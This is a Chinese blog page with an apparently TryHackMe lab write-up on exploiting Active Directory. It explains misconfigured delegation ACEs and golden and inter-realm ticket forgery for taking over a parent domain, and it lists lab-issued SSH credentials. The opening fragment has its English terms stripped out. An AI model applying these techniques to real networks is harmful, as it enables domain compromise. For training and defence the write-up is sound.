域控制器共享因此当用户请求访问资源时它们可以验证收到的的真实性但是如果我们想生成自己的来授予我们访问所有内容的权限该怎么办这称为金票攻击在金票攻击中我们完全绕过并创建我们自己的本质上成为票证授予服务器为了伪造我们需要以下信息域的域的安全标识符我们要模拟的帐户的用户名密码哈希前三个通常很容易恢复最后一个需要域妥协因为密码哈希仅存储在域控制器上幸运的是我们刚刚使用伪造的证书破坏了第层管理员组因此我们能够恢复密码哈希我们将再次使用带有的来恢复上的密码哈希跨领域使用密码哈希我们现在可以伪造黄金票证来访问子域中的任何资源这也将在持久室中进行更详细的讨论然而我们可以通过打造跨领域来更进一步领域间用于提供对其他域中资源的访问在我们的例子中我们希望利用子域和父域之间的双向信任关系来获得对父域的完全访问权限当我们构建金票来执行此漏洞时我们将包含来自其他域的额外帐户可以对此提供帮助允许我们设置的结构的部分部分被描述为指向结构列表的指针该结构包含与主体所属帐户域以外的域中的组相对应的列表这里的关键是我们将通过将企业管理员组的作为额外的添加到我们为子域的域控制器伪造的票证中来利用父域对子域的信任组属于父域并且该组的成员资格实质上授予对整个林的管理权限该组的默认是在我们开始利用之前我们首先需要恢复两个子域控制器的我们将在伪造的中模拟它父域中企业管理员的我们将其作为额外的添加到伪造的中要恢复这些我们可以使用我们可以使用以下命令恢复子域控制器的我们可以使用以下命令查询父域控制器来恢复组的利用域信任我们终于拥有了创建伪造所需的所有信息我们将使用生成这张金票该命令将如下所示首先我们将验证此票证是否可用于访问因为它是子域管理员用户的有效票证这至少证实了金票是为了访问子而伪造的但是由于我们指定了额外的因此我们现在还应该可以访问父这证明我们现在仅通过破坏其中一个子域就完全破坏了父域结论利用需要时间来掌握并且所使用的技术在很大程度上取决于受攻击的结构的配置最需要理解的是这个过程是循环的在大多数情况下我们无法运行单一的引导至漏洞来为我们提供访问权限最好的方法是执行进一步访问的利用然后使用已获得的访问权限再次执行枚举从这个新位置寻找可能的其他利用路径缓解措施攻击与枚举一样非常难以防御这是因为可能被认为是可被利用的错误配置具有实际的业务案例但是我们可以采取一些措施来防止被利用我们需要确保没有配置破坏我们的分层模型较低层中的帐户不应具有与较高层中的资源交互的能力此外较高层的帐户永远不应登录较低层的资源进行权限委托时应遵循最小权限原则此外权限委托应遵循分层模型确保较低层的对象无法更改较高层的对象签名应该强制执行而不仅仅是启用这将阻止凭证中继尝试对象及其配置并不是唯一的利用途径服务例如也应被视为攻击面的一部分并受到保护我们需要实施足够的安全控制来保护子域中的第层基础设施和帐户因为其中一个的泄露可能会导致整个森林的泄露在完成了对的利用后下一步就是挖掘我们的根源确保蓝队不能轻易清除我们的访问权限这将在下一个房间中介绍',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-01 16:13:02',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Exploiting Active Directory</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-10T07:37:23.000Z" title="发表于 2024-06-10 15:37:23">2024-06-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-01T08:13:02.543Z" title="更新于 2024-08-01 16:13:02">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">15.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>54分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Exploiting Active Directory"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/06/10/thm-exploiting-active-directory/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/06/10/thm-exploiting-active-directory/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Exploiting Active Directory</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-06-10T07:37:23.000Z" title="发表于 2024-06-10 15:37:23">2024-06-10</time><time itemprop="dateCreated datePublished" datetime="2024-08-01T08:13:02.543Z" title="更新于 2024-08-01 16:13:02">2024-08-01</time></header><h1 id="0x01-介绍">0x01 介绍</h1>
<p>该网络是 Breaching AD 和 Enumerate AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经突破了 AD 并枚举了域的结构，我们将探索可用于利用枚举中可能出现的错误配置的不同方法。</p>
<h2 id="ad-exploitation">AD Exploitation</h2>
<p>现在我们已经进行了内部勘察并了解了 AD 结构和环境的情况，现在是开发阶段的时候了。此阶段利用错误配置来执行横向移动和权限升级的组合，直到我们达到执行目标的合适位置，如下图所示。这个阶段通常与持久性相结合，以确保我们不会失去我们获得的新位置，但这将在下一个房间中介绍。它通常还与附加枚举相结合，因为我们的新位置可能使我们能够获取有关土地情况的附加信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Ce9bfa3b741afc09bb7a088746c18bf5a.png" alt="img"></p>
<h2 id="学习目标">学习目标</h2>
<p>在此网络中，我们将介绍几种可用于利用 AD 错误配置的方法。这绝不是一个完整的列表，因为可用的方法通常是高度情境化的，并且依赖于 AD 结构和环境。但是，我们将介绍以下利用 AD 的技术：</p>
<ul>
<li>AD Delegation - AD委托</li>
<li>Forcing Authentication Relays - 强制身份验证中继</li>
<li>Group Policy Objects - 组策略对象</li>
<li>Targeting AD Users - 定位 AD 用户</li>
<li>Domain Trusts - 域信托</li>
<li>Silver and Golden Tickets - 银票和金票</li>
</ul>
<p>tips：配置网络过程不赘述</p>
<h2 id="索取您的凭证">索取您的凭证</h2>
<p>为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，导航至 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.loc/creds">http://distributor.za.tryhackme.loc/creds</a> 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。</p>
<p>此凭据对将为您提供对 THMWRK1.za.tryhackme.loc 的 RDP 和 SSH 访问权限。 THMWRK1 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。您可以使用 Remmina 或任何其他类似的远程桌面客户端连接到该主机以进行 RDP。连接时记得指定za.tryhackme.loc的域名。</p>
<p>对于 SSH 访问，您可以使用以下 SSH 命令：</p>
<pre><code class="hljs scss">ssh za<span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\\&lt;AD Username&gt;<span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc
//带入我们的凭证为：Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: michael.cameron <span class="hljs-attribute">Password</span>: Mwtv3419 
//第二个凭据：Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: christine.hall <span class="hljs-attribute">Password</span>: Randall1973
ssh za.tryhackme.loc\\michael.cameron<span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc
ssh za.tryhackme.loc\\christine.hall<span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc</code></pre>
<p>出现提示时，提供您帐户的关联密码。尽管 RDP 可用于所有任务，但 SSH 速度更快。</p>
<p>其中，该房间的网络拓扑图如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610155647133.png" alt="image-20240610155647133"></p>
<h1 id="0x02-利用权限委派">0x02 利用权限委派</h1>
<p>Active Directory 可以通过称为“权限委派”的功能来委派权限和特权（不要与下一个任务中将讨论的 Kerberos 委派混淆）。授权使得 AD 在组织中如此强大。想象一下，我们为一家拥有 50000 名员工的组织工作。由于我们关心安全性，因此我们只有三个有权访问 DA 凭据的用户。这三个用户不可能满足用户的所有请求，例如重置密码。使用委派，我们可以将强制更改用户密码的权限委派给帮助台团队，这意味着他们现在拥有此特定功能的委派权限。原则上，为了保证代表团的安全，应遵循最小特权原则。然而，在大型组织中，这说起来容易做起来难。在此任务中，我们将研究如何利用一些委派错误配置。</p>
<h2 id="权限委派">权限委派</h2>
<p>权限委派漏洞通常称为基于 ACL 的攻击。 AD 允许管理员配置访问控制条目 (ACE) 来填充自主访问控制列表 (DACL)，因此称为基于 ACL 的攻击。几乎任何 AD 对象都可以使用 ACE 进行保护，ACE 描述任何其他 AD 对象对目标对象所具有的允许和拒绝的权限。</p>
<p>但是，如果这些 ACE 配置错误，攻击者就有可能利用它们。让我们再看一下我们的例子。如果 IT 支持团队通过域用户组被授予 ForceChangePassword ACE，则这将被视为不安全。当然，他们能够重置忘记密码的员工的密码，但这种错误配置还允许他们重置特权帐户的密码，例如本质上允许权限升级的域管理员组成员的帐户。</p>
<h2 id="exploiting-aces">Exploiting ACEs</h2>
<p>大量 ACE 可能会被错误配置，并且每种 ACE 的漏洞利用情况各不相同。 <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#">Bloodhound 文档</a>有助于解释枚举的 ACE 以及如何利用它们。然而，我们将在这里看看几个值得注意的：</p>
<ul>
<li>ForceChangePassword：我们能够在不知道用户当前密码的情况下设置用户的当前密码。</li>
<li>AddMembers：我们能够将用户（包括我们自己的帐户）、组或计算机添加到目标组。</li>
<li>GenericAll：我们对对象拥有完全的控制权，包括更改用户密码、注册 SPN 或将 AD 对象添加到目标组的能力。</li>
<li>GenericWrite：我们可以更新目标对象的任何不受保护的参数。例如，这可以让我们更新 scriptPath 参数，这将导致用户下次登录时执行脚本。</li>
<li>WriteOwner：我们有能力更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的额外权限。</li>
<li>WriteDACL：我们能够将新的 ACE 写入目标对象的 DACL。例如，我们可以编写一个 ACE 来授予我们的帐户对目标对象的完全控制权。</li>
<li>AllExtendedRights：我们有能力对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力。</li>
</ul>
<p>为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。两个最佳选项是 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">AD-RSAT</a> PowerShell cmdlet 或 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>。根据环境中的漏洞和检测工具，一种选择可能更加隐蔽。在此任务中，我们将展示两者。</p>
<h2 id="bloodhound">Bloodhound</h2>
